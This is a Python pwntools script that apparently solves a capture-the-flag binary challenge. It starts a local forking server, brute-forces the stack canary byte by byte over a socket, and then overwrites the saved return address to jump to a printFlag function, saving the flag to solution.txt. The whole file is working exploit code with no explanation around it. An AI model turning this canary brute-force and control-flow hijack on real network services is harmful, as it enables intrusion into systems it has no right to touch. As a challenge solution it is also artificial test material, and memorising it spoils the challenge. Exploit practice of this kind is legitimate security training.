#!/usr/bin/env python
from __future__ import print_function

import pwn
import subprocess
import socket
import time

pwn.context.terminal = "tmux splitw -h".split()
pwn.context.arch="amd64"

exe = pwn.context.binary = pwn.ELF('main.elf')
libc = pwn.ELF("/lib/x86_64-linux-gnu/libc.so.6")

#r = pwn.process("./main.elf 11111".split())
#r = pwn.gdb.debug("./main.elf 11111".split(), gdbscript="set follow-fork-mode child")
r = subprocess.Popen("./main.elf 11111".split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

time.sleep(2)

def try_payload(payload, check=False):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("127.0.0.1", 11111))
  s.send(payload)
  s.recv(4096)
  s.shutdown(1)
  result = s.recv(4096)
  s.close()
  if check:
    return result
  if result.find("request handled sucessfully") != -1:
    return True
  else:
    return False

payload = "0" * 1000

for byte_index in range(0, 8):
  for guess in range(0, 256):
    guess_payload = payload + chr(guess)
    if try_payload(guess_payload) == True:
      payload += chr(guess)
      break

payload2 = payload
payload2 += "A" * 8 # rbp
payload2 += pwn.p64(exe.symbols.printFlag)

flag = try_payload(payload2, True)
print("FLAG: %s" % flag)

r.kill()

f = open("./solution.txt", "w")
f.write(flag)
f.close()


